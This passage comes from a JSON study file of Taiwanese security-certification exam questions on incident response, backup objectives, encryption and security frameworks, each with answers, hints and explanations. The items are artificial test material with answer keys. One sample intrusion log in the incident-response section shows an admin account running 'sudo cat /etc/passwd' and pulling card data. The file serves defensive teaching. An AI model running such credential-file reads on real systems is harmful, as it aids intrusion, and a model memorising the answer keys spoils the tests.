     "context": "您的安全團隊在公司的網站伺服器上發現了異常的入侵跡像，資料庫似乎遭受了注入攻擊，且在 Active Directory（AD）主機上發現了未知的高權限帳號。這些跡象都代表了可能有一個進階持續性威脅（Advanced Persistent Threat，APT）組織在進行攻擊。",
     "hint": "對照題幹出現的攻擊跡象，逐項問：這項措施能不能降低同類攻擊再發生的機率？",
     "explanation": "答案 B、C、D。題幹跡象是資料庫遭注入加上 AD 出現未知高權限帳號，屬 APT 式入侵。B 定期安全意識培訓，降低被社交工程當作入口的機率；C 加強網路與系統持續監控，能更早發現異常；D 更嚴格的身份驗證與存取控制，直接壓縮橫向移動與提權空間。A 只針對資料庫主機購買更強的稽核系統，稽核偏向事後記錄與追查，管不到注入的成因，也管不到 AD 的帳號問題，範圍太窄，官方未列入。（官方公告 B、C、D 或 A、B、C、D 皆給分，官方未說明 A 也給分的理由。）",
     "source": "114-1 第8題"
    },
    {
     "stem": "如附圖所示。某機關系統維運商系統更新作業疏失，未發現網頁驗證功能關閉，而導致學員無需身分驗證即可登入系統，使有心人士可查看或取得敏感資料而有外洩之虞。下列何者是最「不」建議之防範措施？",
     "options": [
      "機關建立資通安全緊急應變機制",
      "應完整確認系統相關檢核驗證功能均正常啟用始可對外開放網站",
      "透過敏感資料加密儲存、查詢過程遮蔽及最少揭露來降低外洩風險",
      "落實系統版本更新檢核作業，應於測試機完成各角色、各帳號測試後再上版"
     ],
     "answer": 0,
     "context": "（原題附圖為示意圖，內容：）\n系統維運商：系統更新作業疏失，未發現驗證功能失效\n機關服務網頁（登入畫面，標示「驗證功能失效」）\n學員：無需經身分驗證即可登入系統並可查看學員通訊錄資料，包含姓名身分證字號等敏感資訊",
     "hint": "先釐清事件成因，再逐項問：這項措施對防範同類事件有多直接？",
     "explanation": "答案 A。題幹問的是「防範」系統更新疏失再次發生，最不建議的那一項。B 上線前確認所有驗證與檢核功能正常，D 在測試機完成各角色、各帳號測試後才上版，都是直接針對根因的預防；C 敏感資料加密儲存、查詢遮蔽與最少揭露，即使驗證失效也能降低外洩的範圍。A 建立資通安全緊急應變機制屬於事發後的處理，無法防止這次疏失發生，與題目要求的「防範」不符，所以是最不建議的防範措施。",
     "source": "114-1 第22題"
    },
    {
     "stem": "情境如附圖所示。在上述的情境當中，滲透測試人員發現可以透過修改 HTTP POST 參數得到可網站較高的管理權限，而在測試弱點影響主機安全的深度時，在測試過程中，利用 LFI（Local File Inclusion）的弱點讀取到網站應用程式的組態檔，進而發現了該主機的 mysql 並未針對來源 IP 進行限縮，你身為滲透測試人員在測試報告中下列那一些建議事項，對受測單位而言，在不損及服務可用性的前提下，下列哪些答案符合以最少的金錢、管理、技術對弱點進行有效的管理？",
     "options": [
      "限縮僅有我國 IP 能連接到這個服務網站",
      "限制能連接到 MySQL 的來源 IP",
      "導入 MFA（Multi-factor authentication）身份識別的解決方案",
      "導入網頁應用程式防火牆"
     ],
     "answer": [
      0,
      1
     ],
     "context": "某次針對我國人民而言，極為重要的金融網站服務主機的安全測試中，你身為一名安全測試人員，被指派並接受任務，對一個公開運行的網站系統進行詳細檢查。該網站系統為組織自行開發，主要功能包括用戶查詢和管理操作，後端連接了一個關聯式資料庫。這次測試的目的是發現系統可能存在的安全漏洞，並為後續修復提供依據。\n● 初步階段：弱點掃描\n測試開始時，測試人員先利用自動化弱點掃描工具，對整個網站進行全面檢查。掃描範圍涵蓋常見漏洞，包括資料庫安全、權限管理以及前端輸入驗證。工具標記出幾個高風險區域，表明系統的某些功能可能存在問題，例如輸入處理不當和角色驗證的漏洞。這些提示成為後續滲透測試的重點。\n● 滲透測試過程\n測試人員建立了兩個測試用戶，模擬不同權限層級的操作情境：\n高權限用戶：具備管理功能，可以操作敏感資料和設定系統參數。\n低權限用戶：僅限於基本查詢功能，權限受限。\n● 測試步驟\n測試人員根據弱點掃描的線索進行詳細分析，測試的方向集中於兩個方面：\n1. 測試輸入處理功能的安全性，檢查是否能夠通過特殊輸入進一步存取敏感資源。\n2. 測試權限機制，模擬低權限用戶試圖存取高權限功能的情境，檢查系統是否有足夠的防護措施來防止權限提升。\n3. 在測試過程中，測試人員發現某些功能設計中，存在邏輯缺陷，使得低權限用戶可以通過特定操作存取到高權限界面。這些問題進一步證實了弱點掃描的發現。\n附圖三\n// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', '（圖中已模糊）' );\n/** MySQL database username */\ndefine( 'DB_USER', '（圖中已模糊）' );\n/** MySQL database password */\ndefine( 'DB_PASSWORD', '（圖中已模糊）' );\n/** MySQL hostname */\ndefine( 'DB_HOST', '（圖中已模糊）' );",
     "hint": "逐項檢查題目的兩個條件（成本、服務可用性），再看措施是否針對題幹發現的缺口。",
     "explanation": "答案 A、B。弱點是 LFI 讀到組態檔，且 MySQL 沒有限制來源 IP；題目又要求不損及可用性，並以最少金錢、管理與技術成本處理。B 限制能連到 MySQL 的來源 IP，直接補上被發現的缺口，只是設定存取規則；A 限縮僅我國 IP 可連網站，也是現有設備即可設定的存取控制，成本低。C 導入 MFA 需要新增解決方案，也不處理 LFI 與資料庫對外開放的問題；D 導入 WAF 需要採購與調校維運，成本較高。（官方公告 A、B 為答案，另 B、D 與 A、B、D 兩組也給分，官方未說明理由。）",
     "source": "114-1 第40題"
    }
   ]
  },
  {
   "id": "1.2-02",
   "section": "1.2",
   "title": "BIA、RTO／RPO 與備份",
   "examHits": 16,
   "examRefs": [
    "115-2 第11題",
    "115-1 第11題",
    "114-2 第11題",
    "114-1 第10題",
    "113-2 第20題",
    "112-2 第18題",
    "112-1 第23題",
    "112-1 第24題",
    "111-1 第11題",
    "110-1 第9題",
    "110-1 第11題",
    "110-1 第25題",
    "110-1 第28題",
    "109-1 第2題",
    "109-1 第23題",
    "108-1 第4題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "BIA（業務衝擊分析）是營運持續與災難復原的起點：先找出關鍵業務流程、中斷的衝擊，再訂出恢復的優先順序。接著用幾個數字描述目標：MTD（最大可容忍停機時間）是業務撐得住的上限；RTO（復原時間目標）是系統要在多久內復原；RPO（復原點目標）是資料可以回到多近的時間點，決定備份頻率；WRT（作業重建時間）是系統復原後還要多久讓業務恢復運作。NIST SP 800-34 的關係是 RTO 加 WRT 不能超過 MTD，所以 RTO 比 MTD 還長就是規劃有問題。備份方面常考 3-2-1：三份備份、兩種不同媒體、一份異地，並且加密金鑰也要備份。",
   "keyPoints": [
    "看到 MTD、RTO、RPO 的數字 → 先檢查 RTO（再加作業重建時間）有沒有超過 MTD；超過代表系統還沒復原，業務就已撐不住。",
    "問「還原到最接近災難發生的時間點」→ 看 RPO（資料能損失多少時間）；問「多久內要恢復」→ 看 RTO。",
    "問 BIA 的核心目標 → 找關鍵業務流程、資源中斷衝擊與復原優先順序，不是找技術漏洞、也不是設計架構或測試演練。",
    "DRP 聚焦 IT 設施復原、BCP 涵蓋整體業務持續、ISCP（NIST SP 800-34）針對單一資訊系統的應急；範圍放反的敘述是錯的。",
    "3-2-1：多份、兩種媒體、一份異地；同一顆硬碟的 C 槽 D 槽、同一棟樓不同樓層都不算真正隔離；備份加密金鑰也要另外備份。"
   ],
   "trap": "把 RTO 與 RPO 當成同一件事（一個管時間、一個管資料點），或以為「同一顆硬碟分兩個槽」「同棟樓不同樓層」就符合 3-2-1。",
   "quiz": [
    {
     "stem": "某政府機關在業務衝擊分析（Business Impact Analysis, BIA）後，針對某核心系統訂定目標：MTD（Maximum Tolerable Downtime）：8 小時；RTO（Recovery Time Objective）：12小時；RPO（Recovery Point Objective）：4小時。下列何者最能說明此規劃存在的問題？",
     "options": [
      "RTO超過MTD，可能導致系統完成復原時已超出業務可接受的中斷時間",
      "RTO與RPO的設定差距較大，表示復原程序設計不完整",
      "RPO與MTD間的差距可能造成備份頻率不足",
      "MTD應與RPO保持相同數值，以利災難復原演練"
     ],
     "answer": 0,
     "hint": "回想三個指標各自量的是什麼（時間上限、復原耗時、資料點），再想它們之間必須維持怎樣的大小關係。",
     "explanation": "答案 A。MTD 8 小時代表業務最多只能中斷 8 小時，但 RTO 訂 12 小時，表示系統預計復原時，業務早就超出可容忍的中斷時間，這是最明顯的規劃矛盾。B RTO 與 RPO 量的是不同的事（時間與資料點），數值有差距很正常，並不代表復原程序不完整；C RPO 影響的是備份頻率，不是和 MTD 比較大小；D MTD 與 RPO 沒有必須相等的規則。",
     "source": "115-2 第11題"
    },
    {
     "stem": "備份是目前公司營運的基本要求，其中我們在評估，還原至最接近災難發生的時間點時，依據美國國家標準技術研究院（NIST）特別出版品800-34（SP 800-34）中的相關規定應該參考下列何項指標？",
     "options": [
      "復原時間目標（Recovery Time Objective，RTO）",
      "復原點目標（Recovery Point Objective，RPO）",
      "作業重建時間（Work Recovery Time，WRT）",
      "最大可容忍停機時間（Max Tolerable Downtime，MTD）"
     ],
     "answer": 1,
     "hint": "回想 SP 800-34 中 RTO、RPO、WRT、MTD 各自的定義，再對照題目描述的需求。",
     "explanation": "答案 B。復原點目標（RPO）決定資料可以回到哪一個時間點，也就是「最多可以損失多久的資料」，因此要還原到最接近災難發生時間點，要參考 RPO。A RTO 是系統要多久內復原；C 作業重建時間（WRT）是系統復原後，到業務完全恢復所需的時間；D MTD 是業務可容忍的中斷時間上限。",
     "source": "115-1 第11題"
    },
    {
     "stem": "依據美國國家標準技術研究院（NIST）特別出版品 800-34（SP 800-34）中的相關規定，在進行業務衝擊分析（Business Impact Analysis, BIA）時，下列何項最能正確描述 BIA 的核心目標？",
     "options": [
      "評估資訊系統的技術漏洞，以便制定防護策略",
      "確定關鍵業務流程及其對資源中斷的影響，並設定復原優先級",
      "開發系統架構以確保業務流程的持續性",
      "測試災難復原計劃的可行性，並提供改進建議"
     ],
     "answer": 1,
     "hint": "回想 SP 800-34 對 BIA 的定位與產出，逐項比對。",
     "explanation": "答案 B。NIST SP 800-34 中，BIA 的目的是找出關鍵業務流程、評估資源中斷對它們的衝擊，並據此設定復原優先順序，後續的復原策略與計畫才有依據。A 評估技術漏洞是風險評鑑／弱點評估；C 開發系統架構是設計工作；D 測試災難復原計畫是演練與測試，這三項都不是 BIA。",
     "source": "114-2 第11題"
    },
    {
     "stem": "據 NIST SP 800 系列標準，關於災難復原計畫（Disaster Recovery Plan，DRP）、業務持續性計畫（Business Continuity Plan，BCP）和資訊系統應急準備計畫（Information System Contingency Plan，ISCP）的關聯性，下列何項描述正確？",
     "options": [
      "災難復原計畫（DRP）專注於資訊技術系統的恢復，而業務持續性計畫（BCP）和資訊系統應急準備計畫（ISCP）則專注於組織的整體運營恢復",
      "資訊系統應急準備計畫（ISCP）涵蓋整個組織的業務和資訊系統恢復策略，而災難復原計畫（DRP）和業務持續性計畫（BCP）則關注於特定技術解決方案",
      "業務持續性計畫（BCP）專注於資訊技術系統的恢復，而災難復原計畫（DRP）和資訊系統應急準備計畫（ISCP）則專注於組織的整體運營恢復",
      "災難復原計畫（DRP）專注於資訊技術系統的恢復，業務持續性計畫（BCP）涵蓋組織整體的業務運營持續性，而資訊系統應急準備計畫（ISCP）則專注於特定資訊系統的應急反應"
     ],
     "answer": 3,
     "hint": "回想 SP 800-34 中 DRP、BCP、ISCP 各自涵蓋的範圍，逐項比對選項描述。",
     "explanation": "答案 D。依 NIST SP 800-34 的脈絡：災難復原計畫（DRP）著重資訊技術設施與系統的恢復；業務持續性計畫（BCP）涵蓋組織整體業務運作的持續；資訊系統應急準備計畫（ISCP）針對特定資訊系統的應急反應與復原。A、B、C 都把三者的範圍對調或放錯，所以錯誤。",
     "source": "114-1 第10題"
    },
    {
     "stem": "關於備份 3-2-1 原則的敘述，下列何者正確？",
     "options": [
      "已儲存媒體而言，分開存放在兩種不同儲存媒體",
      "至少三份，分別放到硬碟的 C 槽跟 D 槽",
      "資料分別存放在辦公室不同樓層",
      "備份資料不需備份加密金鑰"
     ],
     "answer": 0,
     "hint": "回想 3-2-1 備份原則每個數字的意義，逐項判斷每句是否符合。",
     "explanation": "答案 A。3-2-1 指三份備份、使用兩種不同儲存媒體、其中一份放在異地，題目 A 的敘述（分開存放在兩種不同儲存媒體）對應其中的「2」。B C 槽與 D 槽通常在同一顆實體硬碟，硬碟故障時一起失效，也不是兩種媒體；C 同一辦公室的不同樓層仍屬同一地點，不是異地；D 備份加密金鑰若不另外備份，金鑰遺失就無法還原資料，這個說法是錯的。",
     "source": "113-2 第20題"
    }
   ]
  },
  {
   "id": "1.2-03",
   "section": "1.2",
   "title": "入侵事件首要應變與遏制",
   "examHits": 15,
   "examRefs": [
    "115-1 第25題",
    "114-2 第10題",
    "114-2 第25題",
    "113-2 第22題",
    "113-2 第40題",
    "112-2 第4題",
    "112-2 第5題",
    "112-2 第15題",
    "111-1 第39題",
    "109-1 第1題",
    "109-1 第21題",
    "108-1 第5題",
    "108-1 第10題",
    "108-1 第11題",
    "108-1 第40題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "遇到入侵、資料外流或端點告警，第一步的原則是「先止血，再查原因，同時保全證據」。正在外流或可能擴散時，優先做網路隔離（把受害主機或網段隔離，而不是關機或重灌），並在隔離的同時擷取記憶體與磁碟映像，因為惡意程式常常只存在記憶體，關機就沒了。接著才是調查範圍、通報、根除與復原。對外公告、反向追蹤攻擊者、全面重灌，都不是第一步。涉及 OT（工控）的勒索事件，因為會影響實體安全與生產，優先序反而是最高；是否付贖金不該決定事件的優先序。若日誌顯示已通過登入的帳號有異常行為，就要先處理該帳號。",
   "keyPoints": [
    "看到「資料正在外流／端點執行惡意程式」→ 第一步是網路隔離，同時保全證據；不要直接關機（記憶體證據消失）或重灌（證據被覆蓋）。",
    "先遏制、後追查：反向追蹤攻擊者 IP、對外公告、全碟掃描都不是第一步。",
    "OT 勒索事件 → 優先序極高，要立即遏制與恢復並與 OT 擁有者緊密合作；不因為「準備付贖金」而降低優先序。",
    "日誌顯示已登入帳號出現異常存取、下載大量資料 → 優先清查並處置該帳號，再考慮擴大評估與規則調整。",
    "殘留攻擊指令碼是入侵已成功的證據，代表要檢討未修補漏洞、深入檢視系統，並檢查防火牆與入侵檢測設定；沒有題幹證據的原因（如釣魚）不要硬加。"
   ],
   "trap": "把「關機」「重灌」「全面掃描」當成好的第一步；這些動作都會破壞證據或延誤遏制。另外也常誤以為先對外公告或先追蹤攻擊者才算積極。",
   "quiz": [
    {
     "stem": "情境如附圖所示。身為 S公司的資安事件應變小組（CSIRT）負責人，在「使用者與實體行為分析（UEBA）」系統發出警報後，應變小組確認內部核心伺服器正發生資料異常外流。依據資安事件應變的最佳實務，在下列選項中，最適合的第一步應對措施為下列何項？",
     "options": [
      "立即對外公告公司系統遭駭，以示資訊透明",
      "嘗試反向追蹤攻擊來源 IP位址，找出攻擊者身分",
      "依據預定的應變計畫，立即隔離受駭伺服器",
      "為了確保服務正常運作，立即重新安裝相關系統"
     ],
     "answer": 2,
     "context": "位於新竹科學園區的頂尖半導體設計公司「S 公司」，其核心資產為存放於本地資料中心的 IC 設計藍圖。為加速全球供應鏈協作，公司正在導入一套建構於雲端原生（Cloud-Native）環境的供應鏈管理（SCM）平台。該平台的開發流程採用 CI/CD（持續整合/持續部署）模式，並引入了生成式 AI 工具以輔助工程師撰寫程式碼。某日，公司的資安監控中心（SOC）接獲 AI 驅動的「使用者與實體行為分析（UEBA）」系統警報，指出有異常的大量資料從 IC 設計藍圖伺服器被存取，疑似資料外洩。經初步調查，攻擊者是透過 SCM 平台所使用的一個第三方開源函式庫漏洞（供應鏈攻擊）滲透，並利用一個設定不當的網路存取規則，從雲端環境橫向移動至本地資料中心。",
     "hint": "回想事件應變流程各階段的順序，逐項判斷這個動作是否適合作為第一步。",
     "explanation": "答案 C。UEBA 警報加上確認資料正在異常外流，第一步要立刻讓損害停止擴大，依既定應變計畫隔離受駭伺服器。A 對外公告需經過事實確認與法務、公關程序，不是第一步；B 反向追蹤攻擊者 IP 通常查不到真正身分，也會拖延遏制；D 為了服務正常而重新安裝系統，會覆蓋證據、也無法確認攻擊者是否仍在。",
     "source": "115-1 第25題"
    },
    {
     "stem": "安全營運中心（SOC）接獲終端偵測與回應（EDR）警報，指出某個人電腦端點可能執行 Cobalt Strike Beacon。為在不影響業務的前提下「快速遏制」並「保全證據」，第一時間最適合採取下列何項作法？",
     "options": [
      "立即關閉端點電源",
      "啟動端點重灌電腦",
      "隔離端點網路，並同時擷取 RAM 與磁碟的鑑識鏡像",
      "啟動端點防毒進行全碟掃描"
     ],
     "answer": 2,
     "hint": "逐項檢查題目的兩個目標：這個動作能否快速遏制？能否保全證據？",
     "explanation": "答案 C。題目要同時「快速遏制」與「保全證據」。C 隔離端點網路能切斷與 C2 的連線，同時擷取 RAM 與磁碟鑑識映像，能保存 Cobalt Strike Beacon 這類常駐記憶體的證據。A 立即關機會讓記憶體裡的證據消失；B 重灌電腦破壞證據，也不能確認怎麼被入侵；D 啟動防毒全碟掃描耗時、會更動檔案時間戳記，Beacon 仍持續與外部連線。",
     "source": "114-2 第10題"
    },
    {
     "stem": "情境如附圖所示。某關鍵基礎設施組織近日遭受新型勒索軟體攻擊，導致部分 OT系統和生產控制面臨停擺威脅。資安營運中心（Security Operations Center, SOC）在事件回應中，針對此類涉及 OT 的勒索軟體事件處理優先序，下列描述何者較為適切？",
     "options": [
      "由於勒索軟體通常只影響特定檔案，且 OT 系統穩定性優先，應優先進行系統備份，然後等待 OT 維運團隊排程處理，避免額外干擾",
      "勒索軟體屬一般惡意軟體，主要任務是收集鑑識證據以追溯攻擊者，OT 系統的影響可稍後評估",
      "此類事件優先序極高，可能對實體安全和關鍵業務營運造成嚴重中斷，需立即啟動遏制與恢復措施，並與 OT 擁有者密切合作",
      "優先順序取決於是否支付贖金，若已決定支付則回應優先順序可降低，以便與攻擊者協商"
     ],
     "answer": 2,
     "context": "近年來，全球網路資安情勢日趨嚴峻，伴隨地緣政治緊張，複雜且高強度的國家級網路攻擊，例如：進階持續性威脅（Advanced Persistent Threat, APT）日益頻繁。這些攻擊不僅針對傳統資訊技術（Information Technology, IT）環境，更擴展至關鍵基礎設施的營運技術（Operational Technology, OT）系統、企業雲端服務與員工行動裝置。攻擊手法融合了勒索軟體、供應鏈攻擊等多種戰術，目的從情資竊取到癱瘓業務不等，對組織的資料完整性、可用性與機密性構成前所未有的挑戰。",
     "hint": "回想事件處理優先序應依據的因素，逐項判斷每句的理由是否成立。",
     "explanation": "答案 C。涉及 OT 的勒索軟體事件可能直接衝擊實體安全與關鍵業務營運，優先序極高，需要立即啟動遏制與恢復措施，並與 OT 擁有者密切合作。A 以為只影響特定檔案而等待排程處理，會延誤處置；B 把它當一般惡意軟體、只收集鑑識證據，忽略 OT 的影響；D 把優先順序綁在是否付贖金，付贖金本身不保證能復原，也不該決定事件的優先序。",
     "source": "114-2 第25題"
    },
    {
     "stem": "如附圖所示，某機關伺服器管理員於系統例行巡檢時，發現應用程式日誌中出現“Unauthorized data access attempt”等告警訊息，下列何者是最優先的應變措施？",
     "options": [
      "確定防毒軟體版本",
      "清查所有管理員帳號使用狀態",
      "進行全面性的網路安全評估",
      "更新防火牆規則以阻擋可疑流量"
     ],
     "answer": 1,
     "context": "2024-01-10T08:23:45.678Z [INFO] User login: username=admin, IP=192.168.1.10, method=SSH\n2024-01-10T08:24:01.123Z [WARNING] Unusual command pattern detected: username=admin, IP=192.168.1.10, command='sudo cat /etc/passwd'\n2024-01-10T08:24:05.678Z [INFO] Database query executed: username=admin, query='SELECT * FROM users'\n2024-01-10T08:24:10.432Z [ERROR] Unauthorized data access attempt: username=admin, resource='user_credit_card_info'\n2024-01-10T08:25:30.789Z [ALERT] Excessive data download by user: username=admin, data=500MB\n2024-01-10T08:30:00.001Z [ALERT] Intrusion detection system triggered: IP=192.168.1.12, method=Port Scanning\n2024-01-10T08:31:00.789Z [INFO] Firewall rule triggered: rule_id=1005, action=block, IP=192.168.1.12\n2024-01-10T08:32:00.456Z [CRITICAL] Multiple failed login attempts: username=root, IP=192.168.1.12\n...",
     "hint": "先讀懂日誌中告警的來源與對象，再逐項判斷哪個措施最直接處理日誌所顯示的狀況。",
     "explanation": "答案 B。日誌顯示 admin 帳號先以 SSH 登入，接著執行 sudo cat /etc/passwd、查詢使用者資料表、嘗試存取信用卡資料、下載 500MB 資料，事件主角是一個已通過登入的帳號，疑似被盜用或內部濫用，最優先是清查所有管理員帳號的使用狀態，必要時停用或重設。A 確認防毒版本與這些行為無關；C 全面性網路安全評估範圍太大、太慢，不是當下最優先；D 更新防火牆規則只能處理外部掃描那一段（防火牆已有阻擋紀錄），無法處理已登入的 admin 帳號。",
     "source": "113-2 第22題"
    },
    {
     "stem": "情境如附圖所示。作為跨國企業的資安管理人員，您在進行核心系統滲透測試時發現了外部系統曾被惡意攻擊，並留下攻擊殘餘的指令碼。下列哪些安全風險及處理的描述較為適當？（複選）",
     "options": [
      "系統存在未修補的漏洞，需要立即更新",
      "需要對系統進行更深入的檢視",
      "需要增強員工對釣魚攻擊和社交工程的警覺性",
      "應該檢查並更新防火牆和入侵檢測系統的配置"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "context": "你是一間跨國企業的資安管理人員，你每一年都必須針對集團、子集團進行安全檢測與合規要求的驗證，在台灣由於集團參與了我國 A 級機關的軟體開發案，你必須針對組織的流程及服務進行合規的證明，你目前必須完成的包含有核心系統的滲透測試、採購的第三方套件商提供的源碼檢測報告及協助集團提交主要服務的系統開發流程的相關資安證明。",
     "hint": "逐項問：這個風險或處理方式，在題幹與附圖中有沒有證據支持？",
     "explanation": "答案 A、B、D。滲透測試發現外部系統曾被惡意攻擊並留下殘餘指令碼，代表攻擊已經成功，與下列風險及處理相符：A 系統可能存在未修補的漏洞，需要立即更新；B 殘餘指令碼可能只是冰山一角，需要對系統做更深入的檢視（找後門、其他受影響主機）；D 邊界與偵測設備（防火牆、入侵檢測系統）未能擋下或偵測，應檢查並更新其配置。C 增強員工對釣魚與社交工程的警覺性，題幹並沒有任何釣魚跡象（跡象只有外部系統被攻擊與殘留指令碼），與情境對不上，所以不選；官方未說明不選的理由，此為依題幹的解讀。",
     "source": "113-2 第40題"
    }
   ]
  },
  {
   "id": "1.2-04",
   "section": "1.2",
   "title": "加密、雜湊與憑證",
   "examHits": 15,
   "examRefs": [
    "113-2 第19題",
    "112-2 第8題",
    "111-1 第3題",
    "110-1 第5題",
    "110-1 第10題",
    "110-1 第12題",
    "109-1 第11題",
    "109-1 第26題",
    "109-1 第28題",
    "109-1 第29題",
    "109-1 第30題",
    "109-1 第31題",
    "109-1 第32題",
    "108-1 第6題",
    "108-1 第13題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "加密題的考法是「把工具放對位置」。對稱式加密（如 AES、RC4）速度快，用來加密大量資料；非對稱式加密（如 RSA、ECC、Diffie-Hellman）速度慢，但能在不安全的通道上解決金鑰配送問題，所以通常用來交換對稱金鑰，這就是 HTTPS／TLS 的做法。數位簽章用來證明來源與完整性，不是用來交換金鑰。雜湊函數（MD5、SHA-1、SHA-2）不是加密：輸入長度任意、輸出長度固定、不可逆、輸入差一個字元結果就差很多，用來確保完整性，也常用來儲存密碼；注意 MD5 與 SHA-1 已有碰撞弱點，不適合高安全要求。",
   "keyPoints": [
    "看到「異地／遠端連線、大量資料傳輸」→ 對稱式加密處理資料，非對稱式加密交換金鑰；選項把兩者對調或用數位簽章交換金鑰都是錯的。",
    "問「確保完整性」→ 雜湊（MD5、SHA 系列）或數位簽章；RC4 是串流加密、RSA 是非對稱加密、Diffie-Hellman 是金鑰協議，不是用來檢查完整性。",
    "問「不同大小資料輸出長度都一樣」→ 雜湊函數（如 MD5 固定 128 位元），加密演算法的密文長度會隨明文變化。",
    "雜湊的特性：輸入長度不限、輸出長度固定、不可逆、微小改動導致結果大變；別被「限制輸入至少 8 字元」這類說法騙到。",
    "密碼儲存不能用明文，要用雜湊（加鹽更好）；加密是可還原的，兩者目的不同。"
   ],
   "trap": "把雜湊當成加密（以為能解回原文）、把數位簽章當成金鑰交換，或以為大量資料要用非對稱式加密才安全。",
   "quiz": [
    {
     "stem": "建置異地或遠距系統的安全連網機制時，請問下列何者通訊安全加密機制規劃較為適當？",
     "options": [
      "採用對稱式加密機制來處理大量訊息，並使用非對稱式加密進行金鑰交換",
      "採用對稱式加密機制來處理大量訊息，並使用數位簽章進行金鑰交換",
      "採用非對稱式加密機制來處理大量訊息，並使用數位簽章進行金鑰交換",
      "採用非對稱式加密機制來處理大量訊息，並使用對稱式加密進行金鑰交換"
     ],
     "answer": 0,
     "hint": "回想對稱式、非對稱式加密與數位簽章各自的特性與用途，逐項判斷每個組合是否合理。",
     "explanation": "答案 A。遠端連網系統的通訊安全標準做法是混合式：用對稱式加密處理大量訊息（速度快），再用非對稱式加密交換對稱金鑰（解決金鑰配送問題）。B、C 用數位簽章交換金鑰是錯的，數位簽章是證明來源與完整性的機制；C、D 用非對稱式加密處理大量資料效率差，D 還把對稱式用來交換金鑰，方向剛好相反。",
     "source": "113-2 第19題"
    },
    {
     "stem": "當使用者利用帳號密碼登入系統時，密碼的儲存基本原則是不可以直接用明文方式存放於資料庫中，因此密碼通常利用加密（Encryption）或是雜湊（Hash）的方式進行編碼轉換。關於雜湊函數的敘述，下列何者錯誤？",
     "options": [
      "雜湊原理是限制輸入長度為 8 字元以上並透過雜湊函數進行計算，計算後會得到一樣長度的密文",
      "常見的雜湊函數有 MD5、SHA-1 及 SHA-2 等",
      "輸入的原始字串只差一個字元，透過雜湊函數得到的結果會差異很大",
      "雜湊函數具有不可逆的特性，無法利用雜湊值計算取得原始資料"
     ],
     "answer": 0,
     "hint": "回想雜湊函數的基本特性，逐項判斷每句是否成立。",
     "explanation": "答案 A。雜湊函數可以接受任意長度的輸入，沒有必須是 8 字元以上的限制；輸出長度由演算法決定（例如 MD5 固定 128 位元），與輸入長度無關。B 常見雜湊有 MD5、SHA-1、SHA-2（前兩者已有碰撞弱點，但確實屬於雜湊函數）；C 輸入差一個字元，結果會大幅改變（雪崩效應）；D 雜湊不可逆，無法由雜湊值算回原文。",
     "source": "112-2 第8題"
    },
    {
     "stem": "下列何種密碼學演算法，對於不同大小的資料，運算後產生的資料長度都一樣？",
     "options": [
      "RC5（Rivest Cipher 5）",
      "RSA（Rivest, Shamir, Adleman）",
      "ECC（Elliptic Curve Cryptography）",
      "MD5（Message Digest Algorithm 5）"
     ],
     "answer": 3,
     "hint": "逐項回想每個演算法屬於哪一類，以及該類演算法輸出長度的特性。",
     "explanation": "答案 D。MD5 是雜湊（訊息摘要）演算法，不論輸入資料多大，輸出都是固定長度的雜湊值。A RC5 是對稱式區塊加密；B RSA 與 C ECC 是非對稱式加密演算法，主要用於加密、簽章或金鑰協商，密文長度會隨資料量或金鑰而變，都不是固定長度的摘要函數。",
     "source": "111-1 第3題"
    },
    {
     "stem": "在規劃建置異地的連網系統時，為了達到大量資料傳輸與通訊的安全，下列何者通訊安全之防護與應變實務規劃較佳？",
     "options": [
      "採用數位簽章提升訊息交換安全，並使用對稱式加密進行金鑰交換",
      "採用非對稱式加密處理大量訊息，並使用對稱式加密進行金鑰交換",
      "採用對稱式加密處理大量訊息，並使用數位簽章進行金鑰交換",
      "採用對稱式加密處理大量訊息，並使用非對稱式加密進行金鑰交換"
     ],
     "answer": 3,
     "hint": "回想對稱式、非對稱式加密與數位簽章各自的特性與用途，逐項判斷每個組合是否合理。",
     "explanation": "答案 D。為異地連網系統兼顧大量資料傳輸與通訊安全，應用對稱式加密處理大量訊息、用非對稱式加密進行金鑰交換。A 數位簽章不是加密手段，又把金鑰交換交給對稱式；B 用非對稱式處理大量資料效率差，而且把金鑰交換交給對稱式加密，等於金鑰配送問題沒解決；C 用數位簽章交換金鑰，數位簽章沒有這項用途。",
     "source": "110-1 第5題"
    },
    {
     "stem": "下列何者機制的目的是用來確保資料的完整性（Integrity）？",
     "options": [
      "RC4（Rivest Cipher 4）",
      "RSA（Rivest, Shamir, Adleman）",
      "Diffie-Hellman",
      "MD5（Message Digest Algorithm 5）"
     ],
     "answer": 3,
     "hint": "機密性、完整性、金鑰協商各有典型機制，題目問的是哪一個用來檢查資料「有沒有被改過」。",
     "explanation": "答案 D。MD5 是雜湊函數，雜湊值可用來檢查資料有沒有被更動，用於確保完整性（雖然 MD5 已有碰撞弱點）。A RC4 是串流加密，保護機密性；B RSA 用於加密與數位簽章；C Diffie-Hellman 是金鑰協議，用來協商共用金鑰，都不是為了檢查完整性而設計。",
     "source": "110-1 第10題"
    }
   ]
  },
  {
   "id": "1.2-05",
   "section": "1.2",
   "title": "NIST CSF 與資安框架",
   "examHits": 14,
   "examRefs": [
    "115-1 第17題",
    "114-2 第9題",
    "114-2 第15題",
    "114-1 第14題",
    "113-2 第8題",
    "113-2 第9題",
    "113-2 第16題",
    "113-2 第17題",
    "113-1 第14題",
    "112-2 第16題",
    "112-2 第17題",
    "112-1 第16題",
    "112-1 第21題",
    "109-1 第12題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "框架題考的是「這個框架管什麼、什麼時候用」。NIST CSF 2.0 有六大功能：Govern（治理）、Identify、Protect、Detect、Respond、Recover；2.0 最明顯的改變是新增 Govern，強調高層責任、策略與把網路安全納入企業整體風險管理，而前面五個功能 1.1 版就有了。ISO/IEC 27001 是資訊安全管理系統（ISMS）要求，現行版為 2022 年版；ISO/IEC 27006 是給驗證機構用的稽核與驗證要求，並不是企業自己導入某項技術時要遵循的標準。IEC 62443 針對工業自動化與控制系統的資安。導入 AI 時，則要看 AI 專屬的法規與指引，例如歐盟 AI 法案與公部門 AI 應用參考手冊。",
   "keyPoints": [
    "看到「六大面向／Govern 治理」→ NIST CSF 2.0（ISO 27001 是管理系統條款與控制項、CIS CSC 是控制項清單、Zero Trust 是架構原則）。",
